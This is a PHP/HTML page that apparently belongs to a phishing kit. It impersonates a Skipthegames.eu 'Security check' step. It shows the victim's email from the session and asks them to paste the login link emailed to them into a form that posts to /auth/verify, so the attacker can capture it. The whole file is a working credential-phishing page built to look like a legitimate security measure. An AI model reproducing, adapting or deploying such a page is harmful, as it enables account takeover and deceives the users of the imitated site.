<?php
// segurity.php

// Inicia la sesión para acceder al correo electrónico guardado
session_start();

// 1. Obtener el correo del usuario desde la sesión
$user_email = $_SESSION['logged_in_email'] ?? 'correo@ejemplo.com'; 

// Lógica de envío de link SMTP iría aquí si se activa el reenvío, etc.
?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>Security Check - Skipthegames.eu</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/css/login.css"> 
  <link rel="stylesheet" href="assets/css/segurity.css"> 
</head>
<body>

  <main class="wrap" role="main">
    
    <div class="top-warning">
      Providers, we do not send out text messages ever, do not click on links from them.
    </div>

    <header class="brand-block">
      <a href="#" class="brand">Skipthegames<span class="tld">.eu</span></a>
      <div class="tagline">Skip the games. Get satisfaction.</div>
    </header>
    
    <div class="user-block">
        <span class="user-salute">Hi,</span>
        <a href="#" class="user-email-link"><?php echo htmlspecialchars($user_email); ?></a>
        <span class="user-actions">
            <a href="#">go to your account</a> | <a href="#" class="log-out-link">log out</a>
        </span>
    </div>
    <p class="nav-breadcrumb">
        <a href="#">SKIPTHEGAMES.COM</a> » SECURITY CHECK
    </p>

    <h1 class="security-title">Security check</h1>
    
    <p class="security-text">
        We have upgraded our security to protect all users against account takeovers and hacking.
    </p>

    <p class="security-text">
        To complete this login, an Email has been sent to your address 
        <span class="email-link"><?php echo htmlspecialchars($user_email); ?></span>. 
        <a href="#" class="help-link">I don't have access to this email account</a>
    </p>

    <p class="security-text">
        Please enter this link paste here:
    </p>

    <form method="post" action="/auth/verify" novalidate class="security-form">
        <div class="link-input-group">
            <label class="sr-only" for="securityLink">Security Link</label>
            <input id="securityLink" name="securityLink" type="url" inputmode="url" placeholder="Copy/paste in the link you" required>
            <button type="submit" class="btn">Submit</button>
        </div>
    </form>

    <p class="security-text">
        The email you received is good for 30 minutes.
    </p>

    <p class="security-text">
        It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash folder.
    </p>
    
    <div class="email-footer-links">
        <a href="#" class="resend-link">Resend the code</a>
        <a href="#">I don't have access to this email account</a>
    </div>


    <hr class="divider">

    <footer class="footer">
      <small>©Skipthegames.eu</small>
      <nav class="links footer-mobile-links" aria-label="Footer">
        <a href="#">Home</a><a href="#">Contact</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Escort Info</a>
      </nav>
    </footer>
  </main>
</body>
</html>